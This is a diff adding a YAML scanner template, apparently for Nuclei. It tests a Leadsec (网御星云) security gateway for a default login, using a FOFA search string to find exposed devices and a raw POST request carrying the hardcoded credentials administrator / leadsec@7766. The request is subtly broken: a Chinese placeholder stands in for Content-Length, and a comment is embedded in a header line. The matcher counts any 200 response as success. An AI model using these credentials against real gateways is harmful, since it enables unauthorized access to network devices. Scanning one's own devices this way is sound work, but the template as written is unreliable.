@@ -1,0 +1,32 @@
+id: poc-ain42a50lt7xi4zg
+info:
+  name: 网御星云安全网关cgi-bin存在弱口令漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ain42a50lt7xi4zg'
+  tags: default-login,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ain42a50lt7xi4zg
+    fofa: title="网御安全网关"
+http:
+- raw:
+  - 'POST /cgi-bin/webui?op=pcm_login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2459.5 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: [计算的内容长度]
+
+    Connection: keep-alive  # 因session=true，需保持连接以传递会话标识（如Cookie）
+
+
+    txt_name=administrator&txt_password=leadsec@7766'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
